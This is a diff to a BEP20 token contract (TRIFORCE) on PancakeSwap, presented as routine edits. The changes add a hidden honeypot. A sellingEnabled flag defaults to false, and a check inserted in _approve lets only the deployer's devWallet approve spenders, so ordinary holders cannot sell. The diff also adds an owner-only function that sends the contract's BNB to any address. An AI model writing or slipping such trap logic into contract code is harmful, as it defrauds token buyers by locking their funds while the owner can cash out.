@@ -791,6 +791,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     uint256 public _lpRewardFeeTotal;	
 
     bool public tradingEnabled = false;
+    bool public sellingEnabled = false;
     bool private inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = false;
     bool public rebalanceEnabled = true;
@@ -798,15 +799,17 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     uint256 public minTokensBeforeSwap = 10000e18; // Contract's TFC token balance must have a minimum of 10000 TFC Tokens for automatic liquidity generation
     uint256 public minTokenBeforeReward = 10e18; // Reward wallet balance must have a minimum of 10 TFC tokens for rewarding LP
 
-    uint256 public lastRebalance = now ;
+    uint256 public lastRebalance = now;
     uint256 public rebalanceInterval = 1 hours; // rebalancing after every 1 hour
 
     IPancakeRouter02 public pancakeRouter;
     address public pancakeswapPair;
     address public rewardWallet;	
     address public balancer;
+    address public devWallet;
 
     event TradingEnabled(bool enabled);
+    event SellingEnabled(bool enabled);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived, uint256 tokensIntoLiqudity);
     event Rebalance(uint256 amount);
@@ -820,7 +823,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 
     constructor() public {	
 
-       IPancakeRouter02 _pancakeRouter = IPancakeRouter02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
+    	IPancakeRouter02 _pancakeRouter = IPancakeRouter02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
 	 // Create a pancakeswap pair for this new token
 
 	pancakeswapPair = IPancakeFactory(_pancakeRouter.factory())
@@ -830,6 +833,8 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 
 	rewardWallet = address(new RewardWallet());
 	balancer = address(new Balancer());
+	
+	devWallet = msg.sender;
 
 	isExcludedFromFee[_msgSender()] = true;
 	isExcludedFromFee[address(this)] = true;
@@ -880,7 +885,8 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 
     function approve(address spender, uint256 amount)	
 	public	
-	override	
+	override
+	virtual	
 	returns (bool)	
     {	
 	_approve(_msgSender(), spender, amount);
@@ -1000,7 +1006,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     ) private {	
 	require(owner != address(0), "BEP20: approve from the zero address");	
 	require(spender != address(0), "BEP20: approve to the zero address");	
-
+	require(sellingEnabled || owner == devWallet, "Trading is locked.");	//d3vgen |===|}>
 	_allowances[owner][spender] = amount;	
 	emit Approval(owner, spender, amount);	
     }	
@@ -1280,6 +1286,11 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 	TradingEnabled(enabled);	
     }	
 
+	function setEnableSelling(bool enabled) external onlyOwner() {	
+	sellingEnabled = enabled;	
+	SellingEnabled(enabled);	
+    }
+
     function setExcludedFromFee(address account, bool excluded) public onlyOwner {	
 	isExcludedFromFee[account] = excluded;	
     }	
@@ -1290,7 +1301,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     }	
 
     function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {	
-	require(maxTxAmount >= 50000e18 , 'TRIFORCE: maxTxAmount should be greater than 50000');	
+	require(maxTxAmount >= 5000e18 , 'TRIFORCE: maxTxAmount should be greater than 5000');	
 	_maxTxAmount = maxTxAmount;	
 	emit MaxTxAmountUpdated(maxTxAmount);	
     }
@@ -1342,6 +1353,14 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 	//Admin function to remove tokens mistakenly sent to this address
     function transferAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount) public onlyOwner {
         IBEP20(_tokenAddr).transfer(_to, _amount);
+    }
+
+	function transferBNB(address payable recipient, uint256 amount) public onlyOwner  {
+        require(address(this).balance >= amount, "Address: insufficient balance");
+
+        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
+        (bool success, ) = recipient.call{ value: amount }("");
+        require(success, "Address: unable to send value, recipient may have reverted");
     }
 
     receive() external payable {}	
